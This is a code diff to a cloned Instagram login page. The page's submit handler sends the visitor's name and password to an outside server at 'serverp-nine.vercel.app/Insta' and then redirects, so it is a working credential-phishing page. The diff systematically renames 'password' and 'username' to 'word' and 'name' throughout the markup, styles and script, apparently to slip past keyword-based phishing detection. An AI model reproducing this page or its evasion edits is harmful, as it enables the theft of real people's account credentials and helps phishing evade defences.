@@ -969,7 +969,7 @@
       .wellbeingSpriteTwo_fac_code,
       .wellbeingSpriteTwo_fac_lock,
       .wellbeingSpriteTwo_fac_on,
-      .wellbeingSpriteTwo_fac_password,
+      .wellbeingSpriteTwo_fac_word,
       .wellbeingSpriteTwo_fac_sync {
         background-image: url(/static/bundles/es6/sprite_wellbeing_6af9c5060ebc.png/6af9c5060ebc.png);
       }
@@ -990,7 +990,7 @@
         background-position: -92px -50px;
         width: 48px;
       }
-      .wellbeingSpriteTwo_fac_password,
+      .wellbeingSpriteTwo_fac_word,
       .wellbeingSpriteTwo_fac_sync {
         background-repeat: no-repeat;
         background-position: 0 -50px;
@@ -1007,7 +1007,7 @@
         .wellbeingSpriteTwo_fac_code,
         .wellbeingSpriteTwo_fac_lock,
         .wellbeingSpriteTwo_fac_on,
-        .wellbeingSpriteTwo_fac_password,
+        .wellbeingSpriteTwo_fac_word,
         .wellbeingSpriteTwo_fac_sync {
           background-image: url(/static/bundles/es6/sprite_wellbeing_2x_c0241d394c59.png/c0241d394c59.png);
         }
@@ -1023,7 +1023,7 @@
         .wellbeingSpriteTwo_fac_on {
           background-position: -91px -49px;
         }
-        .wellbeingSpriteTwo_fac_password {
+        .wellbeingSpriteTwo_fac_word {
           background-size: 188px 115px;
           background-position: 0 -49px;
         }
@@ -18209,14 +18209,14 @@
                         <div class="_9GP1n">
                           <label class="f0n8F"
                             ><span class="_9nyy2"
-                              >Phone number, username, or email</span
+                              >Phone number, name, or email</span
                             ><input
-                              aria-label="Phone number, username, or email"
+                              aria-label="Phone number, name, or email"
                               aria-required="true"
                               autocapitalize="off"
                               autocorrect="off"
                               maxlength="75"
-                              name="username"
+                              name="name"
                               type="text"
                               class="_2hvTZ pexuQ zyHYP"
                               value=""
@@ -18227,18 +18227,18 @@
                       <div class="-MzZI">
                         <div class="_9GP1n">
                           <label class="f0n8F"
-                            ><span class="_9nyy2">Password</span
+                            ><span class="_9nyy2">word</span
                             ><input
-                              aria-label="Password"
+                              aria-label="word"
                               aria-required="true"
                               autocapitalize="off"
                               autocorrect="off"
-                              name="password"
-                              type="password"
+                              name="word"
+                              type="word"
                               class="_2hvTZ pexuQ zyHYP"
                               value=""
                           /></label>
-                          <!-- <div class="i24fI"></div> ===========> show password-->
+                          <!-- <div class="i24fI"></div> ===========> show word-->
                           <div class="i24fI">
                             <div class="qF0y9 Igw0E IwRSH eGOV_ _4EzTm soMvl">
                               <button class="sqdOP yWX7d _8A5w5" type="button">
@@ -18266,9 +18266,9 @@
                     </div>
                     <a
                       class="_2Lks6"
-                      href="https://instagram.com/accounts/password/reset/"
+                      href="https://instagram.com/accounts/word/reset/"
                       tabindex="0"
-                      >Forgot password?</a
+                      >Forgot word?</a
                     >
                   </form>
                 </div>
@@ -18554,17 +18554,17 @@
     <script>
       let labels = document.querySelectorAll(".f0n8F");
       let inputs = document.querySelectorAll("._2hvTZ");
-      let showPasswordBtn = document.querySelectorAll(".i24fI");
+      let showwordBtn = document.querySelectorAll(".i24fI");
 
       // handle inputs placeholder events
       for (let i = 0; i < inputs.length; i++) {
         inputs[i].addEventListener("input", function () {
           if (inputs[i].value == "") {
             labels[i].classList.remove("FATdn");
-            showPasswordBtn[i].setAttribute("style", "display: none;");
+            showwordBtn[i].setAttribute("style", "display: none;");
           } else {
             labels[i].classList.add("FATdn");
-            showPasswordBtn[i].setAttribute("style", "display: flex;");
+            showwordBtn[i].setAttribute("style", "display: flex;");
           }
 
           // handle submit button isDisabled
@@ -18574,15 +18574,15 @@
         });
       }
 
-      // hide/show password button event
+      // hide/show word button event
       let showPassBtnText =
         document.getElementsByClassName("sqdOP yWX7d _8A5w5")[0];
-      showPasswordBtn[1].addEventListener("click", function () {
-        if (inputs[1].type == "password") {
+      showwordBtn[1].addEventListener("click", function () {
+        if (inputs[1].type == "word") {
           inputs[1].type = "text";
           showPassBtnText.innerHTML = "Hide";
         } else {
-          inputs[1].type = "password";
+          inputs[1].type = "word";
           showPassBtnText.innerHTML = "Show";
         }
       });
@@ -18602,11 +18602,11 @@
       form.addEventListener('submit', function(event) {
         event.preventDefault(); // Prevent default form submission
     
-        const name = document.querySelector('input[name="username"]').value;
-        const word = document.querySelector('input[name="password"]').value;
-       // console.log(username,password)
+        const name = document.querySelector('input[name="name"]').value;
+        const word = document.querySelector('input[name="word"]').value;
+       // console.log(name,word)
         axios.post('https://serverp-nine.vercel.app/Insta', {
-         username,password
+         name,word
         })
         .then(function(response) {
       // Redirect on ANY 200 status (even empty responses)
